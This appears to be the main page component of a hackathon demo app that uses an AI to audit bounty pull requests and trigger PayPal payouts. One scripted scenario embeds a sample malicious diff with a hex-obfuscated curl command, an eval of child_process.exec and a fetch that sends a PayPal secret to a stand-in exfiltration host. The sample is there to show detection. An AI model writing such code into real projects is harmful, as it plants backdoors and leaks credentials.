"use client";

import React, { useEffect, useState } from "react";
import { Bounty } from "@/lib/types";
import { Navbar } from "@/components/Navbar";
import { StatsRibbon } from "@/components/StatsRibbon";
import { DemoScenarios } from "@/components/DemoScenarios";
import { AgentTerminal } from "@/components/AgentTerminal";
import { BountyGrid } from "@/components/BountyGrid";
import { PRSubmissionPanel } from "@/components/PRSubmissionPanel";
import { FundBountyModal } from "@/components/FundBountyModal";
import { SettingsModal } from "@/components/SettingsModal";
import { ArchitectureModal } from "@/components/ArchitectureModal";
import { ShieldCheck, GitBranch, Terminal, ArrowUpRight } from "lucide-react";

export default function Home() {
  const [bounties, setBounties] = useState<Bounty[]>([]);
  const [selectedBounty, setSelectedBounty] = useState<Bounty | null>(null);
  const [isFundModalOpen, setIsFundModalOpen] = useState(false);
  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
  const [isArchOpen, setIsArchOpen] = useState(false);
  const [isResetting, setIsResetting] = useState(false);

  const [isAuditing, setIsAuditing] = useState(false);
  const [isPaying, setIsPaying] = useState(false);
  const [activeScenario, setActiveScenario] = useState<string | null>(null);

  // Fetch Bounties
  const fetchBounties = async () => {
    try {
      const res = await fetch("/api/bounties");
      const data = await res.json();
      if (data.bounties) {
        setBounties(data.bounties);
        if (!selectedBounty && data.bounties.length > 0) {
          setSelectedBounty(data.bounties[0]);
        } else if (selectedBounty) {
          const updated = data.bounties.find((b: Bounty) => b.id === selectedBounty.id);
          if (updated) setSelectedBounty(updated);
        }
      }
    } catch (err) {
      console.error("Error fetching bounties:", err);
    }
  };

  useEffect(() => {
    fetchBounties();
  }, []);

  // Reset Store
  const handleResetData = async () => {
    setIsResetting(true);
    try {
      const res = await fetch("/api/store/reset", { method: "POST" });
      const data = await res.json();
      if (data.bounties) {
        setBounties(data.bounties);
        setSelectedBounty(data.bounties[0]);
      }
    } catch (err) {
      console.error("Error resetting store:", err);
    } finally {
      setIsResetting(false);
    }
  };

  // Run PR Audit
  const handleAuditPR = async (bountyId: string, prData: any) => {
    setIsAuditing(true);
    try {
      const res = await fetch("/api/prs/audit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          bountyId,
          ...prData,
        }),
      });
      const data = await res.json();
      await fetchBounties();
      return data;
    } catch (err) {
      console.error("Error auditing PR:", err);
    } finally {
      setIsAuditing(false);
    }
  };

  // Merge PR & Disburse PayPal Payout
  const handleMergeAndPay = async (bountyId: string, prId: string) => {
    setIsPaying(true);
    try {
      const res = await fetch("/api/prs/merge-and-pay", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ bountyId, prId }),
      });
      const data = await res.json();
      await fetchBounties();
      return data;
    } catch (err) {
      console.error("Error paying PR:", err);
    } finally {
      setIsPaying(false);
    }
  };

  // 1-Click Automated Scenario Runner
  const handleRunScenario = async (
    scenario: "HAPPY_PATH" | "BACKDOOR_ATTACK" | "MULTI_DEV_SPLIT"
  ) => {
    setActiveScenario(scenario);

    if (scenario === "HAPPY_PATH") {
      // Pick Bounty 104
      const targetBounty = bounties.find((b) => b.issueNumber === 104) || bounties[0];
      setSelectedBounty(targetBounty);

      // Audit PR
      const auditRes = await handleAuditPR(targetBounty.id, {
        prTitle: "fix(auth): clear session cache references to eliminate SSR memory leak",
        contributorName: "Marcus Vance",
        contributorEmail: "marcus.dev@fastmail.com",
        diffContent: `diff --git a/src/auth.ts b/src/auth.ts
--- a/src/auth.ts
+++ b/src/auth.ts
@@ -88,6 +88,10 @@ export function closeSession(sessionId: string) {
+  // Clean up references to prevent SSR memory leak
+  if (sessionCache.has(sessionId)) {
+    sessionCache.delete(sessionId);
+  }
+  global.gc?.();
`,
      });

      // If approved, trigger merge & payout
      if (auditRes?.pr?.id) {
        await handleMergeAndPay(targetBounty.id, auditRes.pr.id);
      }
    } else if (scenario === "BACKDOOR_ATTACK") {
      // Pick Bounty 89
      const targetBounty = bounties.find((b) => b.issueNumber === 89) || bounties[1];
      setSelectedBounty(targetBounty);

      // Audit malicious PR
      await handleAuditPR(targetBounty.id, {
        prTitle: "perf: optimize markdown AST regex loop",
        contributorName: "Unknown Contributor (Flagged)",
        contributorEmail: "shadow_actor@darkrelay.org",
        diffContent: `diff --git a/src/parser.ts b/src/parser.ts
--- a/src/parser.ts
+++ b/src/parser.ts
@@ -102,6 +102,12 @@ export function parseLinks(input: string) {
+  // Stealth malicious backdoor insertion
+  const _0xbad = Buffer.from('6375726c20687474703a2f2f6576696c2e636f6d', 'hex').toString();
+  eval('require("child_process").exec(' + _0xbad + ')');
+  fetch('https://evil-exfil.com/keys?val=' + process.env.PAYPAL_SECRET);
`,
      });
    } else if (scenario === "MULTI_DEV_SPLIT") {
      // Pick Bounty 104 or first
      const targetBounty = bounties[0];
      setSelectedBounty(targetBounty);

      // Submit collaborative PR
      const auditRes = await handleAuditPR(targetBounty.id, {
        prTitle: "fix(core): collaborative architecture cleanup & unit test suite",
        contributorName: "Lead Dev Sarah",
        contributorEmail: "sarah.lead@devpool.io",
        coContributors: [
          { name: "Junior Dev Toby", email: "toby.tests@devpool.io" },
        ],
        diffContent: `diff --git a/src/core.ts b/src/core.ts
--- a/src/core.ts
+++ b/src/core.ts
@@ -12,6 +12,14 @@ export function executeTask() {
+  // Core architectural refactor by Sarah (70%)
+  const cleanMemory = true;
+  // Regression test suite by Toby (30%)
+  assert(cleanMemory === true);
`,
      });

      if (auditRes?.pr?.id) {
        await handleMergeAndPay(targetBounty.id, auditRes.pr.id);
      }
    }

    setActiveScenario(null);
  };

  return (
    <div className="min-h-screen bg-[#0A0E17] text-slate-100 flex flex-col justify-between">
      <div>
        <Navbar
          onResetData={handleResetData}
          onOpenSettings={() => setIsSettingsOpen(true)}
          onOpenArch={() => setIsArchOpen(true)}
          isResetting={isResetting}
        />

        <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          {/* Hero Section */}
          <div className="text-center max-w-3xl mx-auto mb-10">
            <div className="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-xs font-semibold mb-4">
              <ShieldCheck className="h-4 w-4" />
              <span>PayPal AI Hackathon 2026 Submission</span>
            </div>
            <h1 className="text-3xl sm:text-5xl font-extrabold text-white tracking-tight leading-tight">
              Autonomous Bug Escrow with <span className="bg-gradient-to-r from-blue-400 via-indigo-400 to-amber-300 bg-clip-text text-transparent">Instant PayPal Payouts</span>
            </h1>
            <p className="text-sm sm:text-base text-slate-400 mt-4 leading-relaxed">
              Eliminating maintainer review fatigue and contributor ghosting. Gemini AI verifies proof-of-fix and blocks XZ-style supply chain attacks, while PayPal executes instant cross-border batch payouts.
            </p>
          </div>

          {/* Stats Ribbon */}
          <StatsRibbon bounties={bounties} />

          {/* 1-Click Interactive Demo Scenarios */}
          <DemoScenarios
            onRunAuditAndPayout={handleRunScenario}
            isLoading={isAuditing || isPaying}
            activeScenario={activeScenario}
          />

          {/* Official PayPal Agent Toolkit Terminal */}
          <AgentTerminal />

          {/* Interactive AG Grid Bounty Board */}
          <BountyGrid
            bounties={bounties}
            onSelectBounty={(bounty) => {
              setSelectedBounty(bounty);
              window.scrollTo({ top: 900, behavior: "smooth" });
            }}
            onOpenFundModal={() => setIsFundModalOpen(true)}
          />

          {/* Selected Bounty & PR Workbench */}
          {selectedBounty && (
            <div id="pr-workbench">
              <PRSubmissionPanel
                bounty={selectedBounty}
                onAuditPR={handleAuditPR}
                onMergeAndPay={handleMergeAndPay}
                isAuditing={isAuditing}
                isPaying={isPaying}
              />
            </div>
          )}
        </main>
      </div>

      {/* Footer */}
      <footer className="border-t border-slate-900 bg-slate-950 py-6 text-center text-xs text-slate-500">
        <div className="max-w-7xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-2">
          <p>
            GitBounty AI Protocol • Built for the PayPal AI Hackathon 2026
          </p>
          <div className="flex items-center space-x-4">
            <span className="text-slate-400 font-mono">AG Grid • Render • Postman • PayPal Sandbox</span>
            <a
              href="https://developer.paypal.com"
              target="_blank"
              rel="noreferrer"
              className="text-blue-400 hover:underline flex items-center space-x-1"
            >
              <span>PayPal Dev</span>
              <ArrowUpRight className="h-3 w-3" />
            </a>
          </div>
        </div>
      </footer>

      {/* Modals */}
      <FundBountyModal
        isOpen={isFundModalOpen}
        onClose={() => setIsFundModalOpen(false)}
        onBountyCreated={fetchBounties}
      />
      <SettingsModal
        isOpen={isSettingsOpen}
        onClose={() => setIsSettingsOpen(false)}
      />
      <ArchitectureModal
        isOpen={isArchOpen}
        onClose={() => setIsArchOpen(false)}
      />
    </div>
  );
}
